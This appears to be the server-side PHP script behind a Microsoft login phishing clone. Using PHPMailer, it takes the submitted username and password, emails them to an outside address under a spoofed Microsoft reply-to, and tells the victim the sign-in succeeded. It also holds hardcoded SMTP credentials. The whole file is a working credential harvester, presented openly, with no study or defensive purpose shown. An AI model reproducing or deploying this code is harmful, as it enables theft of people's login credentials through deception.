
<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;


if ($_SERVER["REQUEST_METHOD"] === "POST") {
  require '../vendor/autoload.php';
  $mail = new PHPMailer(true);

  try {
    $mail->isSMTP();
    $mail->Host       = 'sandbox.smtp.mailtrap.io';
    $mail->SMTPAuth   = true;
    $mail->Username   = 'acef2f1056dde6';
    $mail->Password   = 'b6fb019fb0b0c4';
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port       = 2525;

    $mail->setFrom('johndoe@mail.com', 'Microsoft Clone');
    $mail->addAddress('nfjdgvd861@beefarm.cam', 'Joe User');
    $mail->addReplyTo('info@microsoft.com', 'Information');

    $mail->isHTML(true);
    $mail->Subject = 'Microsoft login clone';
    $mail->Body    = '<b>Email</b>:' . $_POST['userName'] . '<br/> <b>Password</b>: ' . $_POST['password'];

    $mail->send();
    echo 'Sign in successfully';
    exit;
  } catch (Exception $e) {
    echo "Server Error/try/catch Error";
    exit;
  }
}

echo 'Method not allowed';
